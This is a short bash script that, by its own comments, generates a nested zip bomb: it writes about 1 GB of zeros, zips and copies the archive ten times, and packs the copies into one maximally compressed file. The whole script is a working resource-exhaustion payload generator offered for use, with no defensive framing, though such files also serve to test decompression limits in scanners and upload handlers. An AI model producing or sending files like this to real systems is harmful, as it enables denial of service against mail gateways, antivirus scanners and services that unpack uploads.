#!/bin/bash
###This script creates a single nested ZipBomb file named zipb.zip in the working directory.

counter=0

#Write 0's to a file equivalent to 1GB in size.
dd if=/dev/zero bs=1024 count=1000000 of=-

#Adds the file to a zip, and clones the zip 9 times.
until [ $counter -gt 9 ]; do
	file=$RANDOM
	cp - $file
	zip zipb.zip $file
	rm $file
	cp zipb.zip zipb-$counter.zip
	let counter+=1
done 

#Zipping all the zips into one file, and doing some disk cleanup.
rm zipb.zip
zip -9 zipb.zip zipb-*
rm -rf zipb-*
rm -
